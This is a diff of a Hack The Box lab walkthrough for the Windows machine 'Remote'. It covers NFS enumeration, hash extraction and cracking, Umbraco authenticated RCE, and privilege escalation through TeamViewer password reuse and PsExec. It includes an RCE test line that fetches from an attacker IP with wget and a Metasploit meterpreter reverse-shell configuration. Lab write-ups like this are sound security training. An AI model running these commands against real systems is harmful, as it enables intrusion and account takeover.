@@ -1,31 +1,27 @@
-```markdown
 # Hack The Box - Remote
 
-<p align="center">
-  <img src="https://img.shields.io/badge/HACK%20THE%20BOX-REMOTE-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white" alt="Hack The Box">
-  <img src="https://img.shields.io/badge/OS-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-  <img src="https://img.shields.io/badge/DIFFICULTY-EASY-00A86B?style=for-the-badge" alt="Easy">
-  <img src="https://img.shields.io/badge/FOCUS-WEB%20EXPLOITATION-8A2BE2?style=for-the-badge" alt="Web Exploitation">
-</p>
+![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Remote-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
+![Operating System](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=black)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
+![Web](https://img.shields.io/badge/Focus-Web-red?style=for-the-badge)
 
-> Remote is an Easy-difficulty Windows machine that features an Umbraco CMS installation. Credentials are discovered through a world-readable NFS share and used to authenticate to the CMS. An authenticated Remote Code Execution vulnerability in Umbraco provides the initial foothold. Post-exploitation enumeration reveals a vulnerable TeamViewer installation whose stored password is reused by the local Administrator account, allowing a successful PsExec attack and resulting in a SYSTEM shell.
+> **Remote** is an Easy-difficulty Windows machine that features an Umbraco CMS installation. Credentials are discovered through a world-readable NFS share and used to authenticate to the CMS. An authenticated Remote Code Execution vulnerability in Umbraco provides the initial foothold. Post-exploitation enumeration reveals a vulnerable TeamViewer installation whose stored password is reused by the local Administrator account, allowing a successful PsExec attack and resulting in a SYSTEM shell.
 
----
+
 
 ## Machine Information
 
 | Property | Value |
 |---|---|
-| **Machine** | Remote |
+| **Machine** | **Remote** |
 | **Platform** | Hack The Box |
-| **Operating System** | Windows |
+| **OS** | Windows |
 | **Difficulty** | Easy |
-| **Target IP** | `10.129.230.172` |
-| **Hostname** | Remote |
-| **Focus** | NFS Enumeration / CMS Exploitation / Credential Gathering / Privilege Escalation |
-
----
-```
+| **IP Address** | `10.129.230.172` |
+| **Primary Focus** | Web Exploitation |
+| **Vulnerabilities** | Umbraco RCE / TeamViewer Credential Exposure |
+| **Initial Access** | NFS Enumeration → Umbraco CMS → RCE |
+| **Privilege Escalation** | TeamViewer Password Reuse → PsExec |
 
 ---
 
@@ -88,8 +84,11 @@ Nmap
 The initial Nmap scan reveals that the target is a Windows host exposing several common services, including FTP, IIS, SMB and NFS.
 
 ```bash
-nmap -A -p- --min-rate=1000 -T4 10.129.230.172
+nmap -sS -sV -sC -p- --min-rate 5000 10.129.230.172 -oN nmap
 ```
+
+<img width="956" height="785" alt="image" src="https://github.com/user-attachments/assets/d725b97f-58fd-4c6f-b489-ab2ce6fdde76" />
+
 
 The scan identifies the following relevant services:
 
@@ -124,7 +123,7 @@ The page contains an **Intranet** section, but there is little useful informatio
 Directory enumeration is performed using Gobuster.
 
 ```bash
-gobuster dir --url=http://10.129.230.172/ --wordlist=/usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.129.230.172/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
 The scan reveals an interesting directory:
@@ -132,6 +131,10 @@ The scan reveals an interesting directory:
 ```text
 /umbraco
 ```
+
+<img width="951" height="739" alt="image" src="https://github.com/user-attachments/assets/5adf299e-f9d7-48ec-b1c1-a3ba93f4407b" />
+
+
 
 Navigating to the directory reveals an **Umbraco CMS** installation.
 
@@ -162,6 +165,9 @@ Enumerate the exported NFS shares:
 ```bash
 showmount -e 10.129.230.172
 ```
+<img width="962" height="84" alt="image" src="https://github.com/user-attachments/assets/e95f55a2-1287-4a3a-a32e-ef0e2cb0da00" />
+
+
 
 The target exposes a share named:
 
@@ -183,10 +189,13 @@ Mount the NFS share:
 sudo mount -t nfs 10.129.230.172:/site_backups backups/
 ```
 
+<img width="961" height="228" alt="image" src="https://github.com/user-attachments/assets/ee3acbfd-c492-4a1a-8ae9-485d7c047003" />
+
+
 After mounting the share, an Umbraco directory is discovered.
 
 ```bash
-ls -la backups/
+ls
 ```
 
 ---
@@ -204,7 +213,7 @@ Umbraco.sdf
 The database can be searched for administrative credentials using `strings`.
 
 ```bash
-strings App_Data/Umbraco.sdf | grep admin
+strings Umbraco.sdf | grep admin
 ```
 
 The output reveals an administrative username and a SHA1 password hash:
@@ -218,6 +227,9 @@ The recovered hash is:
 ```text
 b8be16afba8c314ad33d812f22a04991b90e2aaa
 ```
+
+<img width="959" height="200" alt="image" src="https://github.com/user-attachments/assets/4ed04496-2cd4-41ee-b9ce-41afcb021e6c" />
+
 
 Save the hash locally:
 
@@ -236,6 +248,9 @@ The recovered password is:
 ```text
 baconandcheese
 ```
+
+<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/0a9f24c5-06fc-4c0f-be27-4dffa3be3fd7" />
+
 
 We now have valid Umbraco credentials:
 
@@ -279,7 +294,7 @@ Before attempting to obtain a reverse shell, the vulnerability can be validated 
 For example:
 
 ```python
-cmd = "wget <ATTACKER_IP>/rce"
+cmd = "wget 10.10.14.65/rce"
 ```
 
 A listener can then be started on the attacking machine.
@@ -302,7 +317,7 @@ Configure the module:
 
 ```text
 use exploit/multi/script/web_delivery
-set RHOSTS <ip>
+set RHOSTS 10.129.230.172
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST tun0
 set target 2
@@ -327,6 +342,9 @@ At this point, we have obtained our initial foothold on the machine.
 
 ---
 
+<img width="953" height="590" alt="image" src="https://github.com/user-attachments/assets/b0c4c7dd-fce4-4ab3-82d2-8ceda8287aad" />
+
+
 # User Flag
 
 The user flag is located in the Public users directory:
@@ -346,6 +364,9 @@ With a foothold established, the next step is to enumerate the host and identify
 A TeamViewer service is discovered.
 
 The service description indicates that **TeamViewer 7** is installed.
+
+<img width="952" height="594" alt="image" src="https://github.com/user-attachments/assets/54942265-8c18-43e2-af4b-a83d05109946" />
+
 
 The installed version can be confirmed using PowerShell:
 
@@ -413,6 +434,9 @@ PsExec provides a shell running with SYSTEM privileges.
 ```text
 NT AUTHORITY\SYSTEM
 ```
+
+<img width="956" height="443" alt="image" src="https://github.com/user-attachments/assets/0004f894-06a4-455d-8fdf-cefae8ec2e05" />
+
 
 The machine has now been fully compromised.
 
